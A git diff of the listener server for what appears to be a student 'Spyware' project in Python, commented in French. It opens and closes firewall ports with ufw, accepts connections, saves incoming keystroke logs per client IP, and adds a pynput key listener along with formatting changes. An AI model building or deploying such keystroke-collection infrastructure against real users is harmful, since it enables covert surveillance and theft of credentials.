@@ -10,6 +10,8 @@ import psutil
 import chiffrement
 from chiffrement import *
 
+from pynput.keyboard import Listener
+
 from env import *
 import datetime
 
@@ -17,7 +19,6 @@ TXT_GLOB = ""
 
 
 def argument():
-
     """
          Cette fonction utilise le module argparse pour définir et analyser des arguments de ligne de commande
          pour un programme le projet Spyware.
@@ -27,7 +28,7 @@ def argument():
 
     p = argparse.ArgumentParser(description='Projet Python - Spyware')
     p.add_argument('-l', '--listen', type=int, help="se met en écoute sur le port TCP saisi par "
-                                                               "l'utilisateur et attend les données du spyware UP")
+                                                    "l'utilisateur et attend les données du spyware UP")
     p.add_argument('-s', '--show', action='store_true', help="affiche la liste des fichiers réceptionnées par le "
                                                              "programme")
     p.add_argument('-r', '--readfile', action='store_true', help="affiche le contenu du fichier stocké sur le serveur "
@@ -40,23 +41,22 @@ def argument():
     return args
 
 
-
 def close_port(port):
     if port == 22 or port == 2098:
         print("Pas touche a ce port")
-    else :
-        print("Fermeture port : "+str(port))
-        proto_port = str(port)+"/tcp"
-        subprocess.run(["ufw","delete","allow",proto_port])
+    else:
+        print("Fermeture port : " + str(port))
+        proto_port = str(port) + "/tcp"
+        subprocess.run(["ufw", "delete", "allow", proto_port])
+
 
 def open_port(port):
     if port == 22 or port == 2098:
         print("Pas touche")
-    else :
-        print("Ouverture port : "+str(port))
-        proto_port = str(port)+"/tcp"
-        subprocess.run(["ufw","allow",proto_port])
-
+    else:
+        print("Ouverture port : " + str(port))
+        proto_port = str(port) + "/tcp"
+        subprocess.run(["ufw", "allow", proto_port])
 
 
 def kill_all():
@@ -64,8 +64,8 @@ def kill_all():
     pid = os.getpid()
     os.kill(pid, 9)
 
-def chrono():
 
+def chrono():
     """
     Fonction qui permet d'afficher le chronomètre en seconde.
     Si les seconde dépasse les 600 s on lance la fonction Kill all.
@@ -86,31 +86,35 @@ def chrono():
                 kill_all()
 
 
-def commands():
+def kpr(key):
+    if key == "Key.enter":
+        return True
 
+
+def touchenter():
+    with Listener(on_press=kpr) as listener:
+        listener.join()
+
+
+def commands():
     """
     La fonction demande un
     La fonction ne retourne rien
     """
 
     while True:
-
-        parse = ""
         cmd = input(">>>")
         parse = cmd.split()
 
-        if parse == "\n" :
-            break
-
         if parse:
             if parse[0] == "new":
-                #try :
-                    print(parse[1])
-                    open_port(int(parse[1]))
-                    receiver_t = threading.Thread(target=receiver, args=(int(parse[1]),))
-                    receiver_t.start()
-                #except :
-                #    print("Erreur dans l'ajout du nouveau client")
+                # try :
+                print(parse[1])
+                open_port(int(parse[1]))
+                receiver_t = threading.Thread(target=receiver, args=(int(parse[1]),))
+                receiver_t.start()
+            # except :
+            #    print("Erreur dans l'ajout du nouveau client")
             elif parse[0] == "kill":
                 if parse[1] == "all":
                     kill_all()
@@ -118,14 +122,17 @@ def commands():
                     print("il manque un argument")
                 else:
                     print(close_port(int(parse[1])))
-                    print("Client(s) sur port "+parse[1]+" terminated")
-        else :
+                    print("Client(s) sur port " + parse[1] + " terminated")
+        else:
             break
 
-    #client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    #client_socket.connect((SRV, PORT))
-    #client_socket.send(cmd.encode('utf-8'))  # envoi
-    #client_socket.close()
+        if touchenter():
+            break
+
+    # client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # client_socket.connect((SRV, PORT))
+    # client_socket.send(cmd.encode('utf-8'))  # envoi
+    # client_socket.close()
 
 
 def receiver(port):
@@ -139,7 +146,6 @@ def receiver(port):
 
     while True:
         client_socket, client_address = server_socket.accept()
-
 
         ficname = f"{client_address[0]}-{datetime.date.today()}-keyboard.txt"
         # recu data
